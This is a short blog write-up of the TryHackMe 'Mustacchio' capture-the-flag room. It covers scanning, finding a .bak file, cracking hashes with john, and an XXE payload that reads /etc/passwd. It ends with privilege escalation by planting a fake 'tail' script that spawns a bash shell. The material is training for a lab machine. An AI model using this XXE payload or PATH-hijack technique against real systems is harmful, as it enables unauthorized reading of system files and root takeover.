---
layout: post
title: Mustacchio — Tryhackme (Writeup)
date: 2025-07-06
categories: [TRYHACKME-WRITEUPS]
tag: [cybersecurity, writeups,TRYHACKME]
---

& [BlueCoder](https://tryhackme.com/p/blueCoder) Writeup to the

[Mustacchio Tryhackme challenge](https://tryhackme.com/room/mustacchio)


Deploy and compromise the machine! ☠️

## Scanning & Enumeration

![nmap-scan](/images/Tryhackme-Mustacchio/nmap-scan.jpg)

```console
rustscan -a ipv4
```

![dir-enum](/images/Tryhackme-Mustacchio/dir-enum.jpg)

```console
gobuster dir -u http://ip_addr/example -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x.html,.css,.js
```

A .bak file is a backup file and  .bak files can be very interesting because they often contain credentials or hidden info.

![dir-enum2](/images/Tryhackme-Mustacchio/dir-enum2.jpg)

## Exploitation

![exploit-bak](/images/Tryhackme-Mustacchio/exploit-bak.jpg)


## Hash Cracking

![hash-cracking](/images/Tryhackme-Mustacchio/hash-cracking.jpg)

```console
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Post-Exploitation

```console
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<root>
<name>anonymous</name>
<author>&xxe;</author>

</root>
```

![xxe-exploit](/images/Tryhackme-Mustacchio/xxe.jpg)



![RSA-PRIVATE-KEY](/images/Tryhackme-Mustacchio/RSA.jpg)

Credential Cracking

![credential-cracking](/images/Tryhackme-Mustacchio/cred-cracking.jpg)

# Privilege Escalation

![SUID-bits](/images/Tryhackme-Mustacchio/suidbits.jpg)

```console
cd /home/barry
touch tail
```
```console
┌──(hunt3r㉿HUNT3R)-[~]
└─$ cat > tail      
#!/usr/bin/python3
__import__("pty").spawn("/bin/bash")
```
```console
┌──(hunt3r㉿HUNT3R)-[~]
└─$ chmod a+x tail 
```


What is the root flag?

![root](/images/Tryhackme-Mustacchio/root-flag.jpg)